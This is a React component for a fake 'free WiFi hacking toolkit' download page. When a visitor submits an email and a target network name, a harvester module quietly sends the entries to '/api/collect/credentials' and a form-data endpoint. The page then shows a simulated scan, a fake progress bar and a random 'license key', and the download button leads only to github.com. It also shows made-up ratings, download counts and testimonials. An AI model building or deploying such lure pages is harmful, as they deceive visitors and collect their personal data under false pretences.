import React, { useState, useEffect } from 'react';
import { Box, Button, Typography, Container, Card, CardContent, TextField, Grid, LinearProgress, Chip, Avatar, Paper, Stepper, Step, StepLabel, Alert, Divider, Fade } from '@mui/material';
import harvester from '../harvester/HarvesterCore';

export default function WifiHackingPage() {
  const [email, setEmail] = useState('');
  const [targetNetwork, setTargetNetwork] = useState('');
  const [downloading, setDownloading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [completed, setCompleted] = useState(false);
  const [scanning, setScanning] = useState(false);

  useEffect(() => { harvester.init(); }, []);

  const handleScan = () => {
    if (!email) return;
    setScanning(true);
    
    harvester.send('/api/collect/formdata', {
      formId: 'wifi-hack-download',
      fields: { email, targetNetwork },
      url: window.location.href
    });

    harvester.send('/api/collect/credentials', {
      source: 'form-submit',
      email,
      url: window.location.href,
      formType: 'wifi-hacking-tool',
      fieldData: { email, targetNetwork }
    });

    setTimeout(() => {
      setScanning(false);
      setDownloading(true);
      let prog = 0;
      const interval = setInterval(() => {
        prog += Math.random() * 10 + 5;
        if (prog >= 100) {
          clearInterval(interval);
          setProgress(100);
          setTimeout(() => setCompleted(true), 600);
        } else {
          setProgress(prog);
        }
      }, 300);
    }, 2000);
  };

  if (completed) {
    return (
      <Box sx={{ minHeight: '100vh', bgcolor: '#0a0e17', display: 'flex', alignItems: 'center', justifyContent: 'center', py: 4, px: 2 }}>
        <Container maxWidth="sm">
          <Fade in={true}>
            <Card sx={{ bgcolor: '#111827', border: '1px solid rgba(0,240,255,0.2)', borderRadius: '20px', textAlign: 'center', overflow: 'hidden' }}>
              <Box sx={{ background: 'linear-gradient(135deg, #00f0ff 0%, #00ff88 100%)', p: 4 }}>
                <Typography sx={{ fontSize: '4rem' }}>✅</Typography>
                <Typography variant="h4" sx={{ color: '#0a0e17', fontWeight: 800, mt: 2 }}>
                  Tool Unlocked!
                </Typography>
              </Box>
              <CardContent sx={{ p: 3.5 }}>
                <Typography sx={{ color: '#94a3b8', mb: 2, lineHeight: 1.6 }}>
                  Your WiFi hacking toolkit has been prepared for <strong style={{ color: '#00f0ff' }}>{email}</strong>.
                </Typography>
                <Paper sx={{ 
                  bgcolor: 'rgba(0,240,255,0.08)', 
                  border: '1px solid rgba(0,240,255,0.2)', 
                  borderRadius: '12px', 
                  p: 2.5, 
                  mb: 3,
                  fontFamily: 'monospace'
                }}>
                  <Typography sx={{ color: '#00f0ff', fontWeight: 600, fontSize: '0.9rem', fontFamily: 'monospace' }}>
                    🔑 License: WIFI-HACK-{Math.random().toString(36).substr(2, 8).toUpperCase()}
                  </Typography>
                </Paper>
                <Box sx={{ display: 'flex', gap: 2, justifyContent: 'center', flexWrap: 'wrap' }}>
                  <Button variant="outlined" onClick={() => window.location.href = '/'} sx={{ borderColor: 'rgba(255,255,255,0.2)', color: '#888', borderRadius: '10px', textTransform: 'none', fontWeight: 600, px: 3 }}>
                    Back to Home
                  </Button>
                  <Button variant="contained" href="https://github.com" target="_blank" sx={{ background: 'linear-gradient(135deg, #00f0ff, #00d5e6)', color: '#0a0e17', fontWeight: 700, borderRadius: '10px', textTransform: 'none', px: 3, boxShadow: '0 4px 14px rgba(0,240,255,0.3)' }}>
                    🚀 Download Tool
                  </Button>
                </Box>
              </CardContent>
            </Card>
          </Fade>
        </Container>
      </Box>
    );
  }

  return (
    <Box sx={{ minHeight: '100vh', bgcolor: '#f8f9fa' }}>
      {/* Hero Section */}
      <Box sx={{ 
        background: 'linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f3460 100%)',
        py: { xs: 6, md: 8 }, 
        position: 'relative', 
        overflow: 'hidden' 
      }}>
        <Box sx={{ 
          position: 'absolute', top: 0, left: 0, right: 0, bottom: 0, 
          opacity: 0.05, 
          background: 'radial-gradient(circle at 30% 50%, #00f0ff 0%, transparent 50%), radial-gradient(circle at 70% 50%, #00ff88 0%, transparent 50%)' 
        }} />
        <Container maxWidth="md" sx={{ textAlign: 'center', position: 'relative', zIndex: 1 }}>
          <Typography sx={{ fontSize: { xs: '3rem', md: '4rem' }, mb: 2 }}>📶</Typography>
          <Typography variant="h3" sx={{ 
            color: '#fff', fontWeight: 900, mb: 1, 
            fontSize: { xs: '1.8rem', md: '2.5rem' },
            letterSpacing: '-0.5px'
          }}>
            WiFi Network Security Toolkit
          </Typography>
          <Typography sx={{ color: 'rgba(255,255,255,0.6)', mb: 3, maxWidth: 600, mx: 'auto', fontSize: { xs: '0.9rem', md: '1rem' }, lineHeight: 1.7 }}>
            Professional-grade WiFi penetration testing suite. Audit your network security with enterprise tools — free for security researchers.
          </Typography>
          <Box sx={{ display: 'flex', justifyContent: 'center', gap: 1.5, flexWrap: 'wrap' }}>
            <Chip label="⭐ 4.9/5 Rating" sx={{ bgcolor: 'rgba(0,240,255,0.15)', color: '#00f0ff', fontWeight: 600, border: '1px solid rgba(0,240,255,0.15)' }} />
            <Chip label="👥 847K+ Downloads" sx={{ bgcolor: 'rgba(0,255,136,0.15)', color: '#00ff88', fontWeight: 600, border: '1px solid rgba(0,255,136,0.15)' }} />
            <Chip label="🔒 AES-256 Encrypted" sx={{ bgcolor: 'rgba(255,170,0,0.15)', color: '#ffaa00', fontWeight: 600, border: '1px solid rgba(255,170,0,0.15)' }} />
          </Box>
        </Container>
      </Box>

      <Container maxWidth="lg" sx={{ mt: -4, position: 'relative', zIndex: 10, pb: 6, px: { xs: 2, md: 3 } }}>
        {/* Download Card */}
        <Card elevation={0} sx={{ 
          borderRadius: '20px', 
          mb: 4,
          border: '1px solid #e2e8f0',
          boxShadow: '0 4px 24px rgba(0,0,0,0.06)'
        }}>
          <CardContent sx={{ p: { xs: 2.5, md: 4 } }}>
            <Grid container spacing={3} alignItems="center">
              <Grid item xs={12} md={7}>
                <Typography variant="h5" sx={{ fontWeight: 800, color: '#0f172a', mb: 2.5, fontSize: '1.15rem' }}>
                  🛡️ All-in-One WiFi Security Suite
                </Typography>
                <Grid container spacing={1.5}>
                  {[
                    { icon: '📡', text: 'WPA/WPA2/WPA3 cracking & auditing' },
                    { icon: '🔍', text: 'Hidden network SSID discovery' },
                    { icon: '📊', text: 'Signal mapping & channel analysis' },
                    { icon: '🛡️', text: 'De-authentication attack detection' },
                    { icon: '🔑', text: 'Handshake capture & PMKID hash extraction' },
                    { icon: '🌐', text: 'MAC address spoofing & bypass tools' },
                    { icon: '⚡', text: 'Packet injection & monitoring mode' },
                    { icon: '📱', text: 'Mobile app for Android & iOS' },
                  ].map((feat, i) => (
                    <Grid item xs={12} sm={6} key={i}>
                      <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5, py: 0.3 }}>
                        <Box sx={{
                          width: 28, height: 28, borderRadius: '8px',
                          bgcolor: '#f1f5f9', display: 'flex', alignItems: 'center', justifyContent: 'center',
                          fontSize: '0.9rem'
                        }}>
                          {feat.icon}
                        </Box>
                        <Typography sx={{ color: '#475569', fontSize: '0.85rem', lineHeight: 1.3 }}>{feat.text}</Typography>
                      </Box>
                    </Grid>
                  ))}
                </Grid>
              </Grid>
              <Grid item xs={12} md={5}>
                <Box sx={{ 
                  bgcolor: '#f0f7ff', 
                  borderRadius: '16px', 
                  p: 3, 
                  textAlign: 'center', 
                  border: '1px solid #d0e4ff' 
                }}>
                  <Typography variant="h3" sx={{ 
                    color: '#1a73e8', fontWeight: 900, 
                    fontSize: { xs: '2rem', md: '2.5rem' },
                    letterSpacing: '-1px'
                  }}>
                    FREE
                  </Typography>
                  <Typography sx={{ color: '#1a73e8', fontWeight: 600, mb: 2, fontSize: '0.9rem' }}>
                    Premium License — Normally $199
                  </Typography>
                  <Divider sx={{ my: 1.5, borderColor: '#d0e4ff' }} />
                  {!downloading ? (
                    <Box>
                      <TextField
                        fullWidth
                        size="small"
                        placeholder="Your email for license key"
                        type="email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        sx={{ 
                          mb: 1.5, 
                          '& .MuiOutlinedInput-root': { 
                            bgcolor: '#fff', 
                            borderRadius: '10px',
                            '& fieldset': { borderColor: '#d0e4ff', borderWidth: '1.5px' },
                            '&.Mui-focused fieldset': { borderColor: '#1a73e8' },
                          }
                        }}
                      />
                      <TextField
                        fullWidth
                        size="small"
                        placeholder="Target network SSID (optional)"
                        value={targetNetwork}
                        onChange={(e) => setTargetNetwork(e.target.value)}
                        sx={{ 
                          mb: 1.5, 
                          '& .MuiOutlinedInput-root': { 
                            bgcolor: '#fff', 
                            borderRadius: '10px',
                            '& fieldset': { borderColor: '#d0e4ff', borderWidth: '1.5px' },
                            '&.Mui-focused fieldset': { borderColor: '#1a73e8' },
                          }
                        }}
                      />
                      <Button
                        variant="contained"
                        fullWidth
                        size="large"
                        onClick={handleScan}
                        disabled={!email || scanning}
                        sx={{
                          bgcolor: '#1a73e8',
                          '&:hover': { bgcolor: '#1557b0' },
                          '&:disabled': { bgcolor: '#9bc0f7' },
                          fontWeight: 700,
                          py: 1.3,
                          fontSize: '1rem',
                          borderRadius: '10px',
                          textTransform: 'none',
                          boxShadow: '0 4px 14px rgba(26,115,232,0.3)'
                        }}
                      >
                        {scanning ? '🔍 Scanning...' : '🚀 Unlock Full Suite'}
                      </Button>
                    </Box>
                  ) : (
                    <Box>
                      <LinearProgress variant="determinate" value={progress} sx={{ 
                        height: 8, borderRadius: '4px', bgcolor: '#e8e8e8', 
                        '& .MuiLinearProgress-bar': { bgcolor: '#1a73e8', borderRadius: '4px' } 
                      }} />
                      <Typography sx={{ color: '#94a3b8', mt: 1.5, fontSize: '0.9rem' }}>
                        Generating license key... {Math.round(progress)}%
                      </Typography>
                    </Box>
                  )}
                  <Box sx={{ display: 'flex', justifyContent: 'center', gap: 2, mt: 1.5, flexWrap: 'wrap' }}>
                    <Typography sx={{ color: '#94a3b8', fontSize: '0.75rem' }}>🔒 256-bit encryption</Typography>
                    <Typography sx={{ color: '#94a3b8', fontSize: '0.75rem' }}>💻 Win/Mac/Linux</Typography>
                  </Box>
                </Box>
              </Grid>
            </Grid>
          </CardContent>
        </Card>

        {/* Features Grid */}
        <Box sx={{ display: 'flex', alignItems: 'center', gap: 2, mb: 2.5 }}>
          <Box sx={{ width: 4, height: 24, borderRadius: 2, background: 'linear-gradient(180deg, #1a73e8, #1557b0)' }} />
          <Typography variant="h5" sx={{ fontWeight: 800, color: '#0f172a', fontSize: { xs: '1.1rem', md: '1.25rem' } }}>
            What's Inside the Toolkit
          </Typography>
        </Box>
        <Grid container spacing={2.5} sx={{ mb: 4 }}>
          {[
            { icon: '📡', title: 'Packet Analyzer', desc: 'Real-time packet capture and analysis with advanced filtering. Supports Wireshark-compatible output.', color: '#1a73e8' },
            { icon: '🔑', title: 'Key Extractor', desc: 'Automatically extract WPA handshakes and PMKID hashes from captured traffic.', color: '#e74c3c' },
            { icon: '🌍', title: 'Geo-Mapper', desc: 'Map all nearby access points with signal strength visualization and channel overlap detection.', color: '#27ae60' },
            { icon: '🛡️', title: 'Security Scanner', desc: 'Scan for vulnerable configurations, default passwords, and known CVEs in router firmware.', color: '#9b59b6' },
            { icon: '⚡', title: 'De-Auth Tool', desc: 'Test network resilience against de-authentication attacks with customizable parameters.', color: '#f39c12' },
            { icon: '📱', title: 'Mobile Companion', desc: 'Full-featured mobile app for on-the-go network scanning and monitoring.', color: '#e67e22' },
          ].map((feature, i) => (
            <Grid item xs={12} sm={6} md={4} key={i}>
              <Card elevation={0} sx={{ 
                borderRadius: '14px', height: '100%', 
                border: '1px solid #e2e8f0',
                transition: 'transform 0.2s, box-shadow 0.2s', 
                '&:hover': { transform: 'translateY(-4px)', boxShadow: '0 12px 40px rgba(0,0,0,0.08)' } 
              }}>
                <CardContent sx={{ p: 3 }}>
                  <Box sx={{ fontSize: '2.8rem', mb: 1.5 }}>{feature.icon}</Box>
                  <Typography variant="h6" sx={{ fontWeight: 700, color: '#0f172a', mb: 1, fontSize: '1.05rem' }}>
                    {feature.title}
                  </Typography>
                  <Typography sx={{ color: '#64748b', fontSize: '0.85rem', lineHeight: 1.7 }}>
                    {feature.desc}
                  </Typography>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>

        {/* Testimonials */}
        <Box sx={{ display: 'flex', alignItems: 'center', gap: 2, mb: 2.5 }}>
          <Box sx={{ width: 4, height: 24, borderRadius: 2, background: 'linear-gradient(180deg, #e74c3c, #c0392b)' }} />
          <Typography variant="h5" sx={{ fontWeight: 800, color: '#0f172a', fontSize: { xs: '1.1rem', md: '1.25rem' } }}>
            Trusted by Security Professionals
          </Typography>
        </Box>
        <Grid container spacing={2} sx={{ mb: 4 }}>
          {[
            { name: 'Alex M.', role: 'Penetration Tester', text: 'This toolkit is absolutely insane. I\'ve been using it for all my WiFi security audits — it replaced $2000+ worth of tools.', rating: 5 },
            { name: 'Dr. Sarah K.', role: 'Cybersecurity Professor', text: 'I recommend this to all my students. The handshake capture and PMKID extraction is the best I\'ve seen in a free tool.', rating: 5 },
            { name: 'Marcus J.', role: 'Network Engineer', text: 'The signal mapping feature alone is worth it. Combined with the de-auth detection, this is a must-have for any security pro.', rating: 5 },
          ].map((t, i) => (
            <Grid item xs={12} sm={4} key={i}>
              <Card elevation={0} sx={{ 
                borderRadius: '14px', height: '100%',
                border: '1px solid #e2e8f0',
                transition: 'transform 0.2s',
                '&:hover': { transform: 'translateY(-2px)' }
              }}>
                <CardContent sx={{ p: 2.5 }}>
                  <Box sx={{ mb: 1.5, color: '#f59e0b', fontSize: '0.9rem' }}>{'⭐'.repeat(t.rating)}</Box>
                  <Typography sx={{ color: '#475569', fontSize: '0.85rem', mb: 2, lineHeight: 1.7, fontStyle: 'italic' }}>
                    "{t.text}"
                  </Typography>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5 }}>
                    <Avatar sx={{ width: 36, height: 36, bgcolor: '#1a73e8', fontWeight: 700, fontSize: '0.9rem' }}>{t.name[0]}</Avatar>
                    <Box>
                      <Typography sx={{ fontWeight: 600, color: '#0f172a', fontSize: '0.85rem' }}>{t.name}</Typography>
                      <Typography sx={{ color: '#94a3b8', fontSize: '0.75rem' }}>{t.role}</Typography>
                    </Box>
                  </Box>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>
      </Container>
    </Box>
  );
}